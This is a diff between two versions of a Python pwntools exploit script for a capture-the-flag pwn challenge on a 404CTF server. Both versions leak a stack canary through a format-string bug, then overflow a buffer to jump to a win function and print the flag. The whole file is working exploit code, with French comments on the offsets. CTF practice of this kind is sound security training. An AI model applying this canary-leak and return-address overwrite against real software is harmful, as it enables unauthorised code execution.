@@ -1,53 +1,32 @@
-from pwn import remote, p64
+from pwn import *
+warnings.filterwarnings("ignore", category=BytesWarning)
+io = remote("challenges.404ctf.fr", 30223)
 
+io.sendline("2")
+# try with %10$ ... %20$p => find an address like 0x...00 => this address is the canary address
+io.sendline("%17$p ")
 
-def recv_choice():
-    global p
-    data = p.recvuntil(b">>> ")
-    print(data.decode())
+io.recvuntil("[Vous] : ")
+addr_canary = io.recvline()[:-1].decode()
+print("@ canary:", addr_canary)
 
+#String to hex
+addr_canary = int(addr_canary, 16)
+#convert to address format
+addr_canary = p64(addr_canary)
 
-def recv_choice_1():
-    global p
-    data = p.recvuntil(b"[Vous] : ")
-    print(data.decode())
+aff = io.recvuntil(">>> ")
+#address of the function named Canary (found in Ghidra or objdump -d | grep canary)
+addr_fct_canary = p64(0x00400877)
 
+offset = 72
+payload = b"A" * offset + addr_canary + 8* b"A" + addr_fct_canary
 
-def leak_canary():
-    global p
-    p.sendline(b"2")
-
-    canary_leak = "%17$p"
-    p.sendline(canary_leak.encode())
-    p.recvuntil(b"[Vous] : ")
-    canary = p.recvline().rstrip()
-    return int(canary.decode()[2:], 16)
-
-
-HOST = "challenges.404ctf.fr"
-PORT = 30223
-p = remote(HOST, PORT)
-# p = process("./la_cohue")
-win_addr = 0x400877  # <- Adresse de canary() qui retrouve le flag
-
-recv_choice()
-# Find canary
-canary = leak_canary()
-print("Canary: ", hex(canary))
-
-
-recv_choice()
-# Overflow
-p.sendline(b"1")
-recv_choice_1()
-payload = b"A"*0x48 + p64(canary) + b"A"*8 + p64(win_addr)  # On écrit à rbp-0x50 et le canari est à rbp-0x8
-# On ecrit donc 0x48 junk puis le canary pour ne pas overwrite le canary puis on overwrite rbp et enfin on met l'adresse de la
-# fonction à la place de la return address
-print(payload)
-p.sendline(payload)
-
-# Get flag
-recv_choice()
-p.sendline(b"3")
-flag = p.recvuntil(b"}")
-print(flag)
+io.sendline("1")
+io.recvuntil("[Vous] : ")
+io.sendline(payload)
+print(io.recvline().decode())
+io.recvuntil(">>> ").decode()
+io.sendline("3")
+print(io.recvline().decode())
+print("Flag : "+io.recvline().decode())
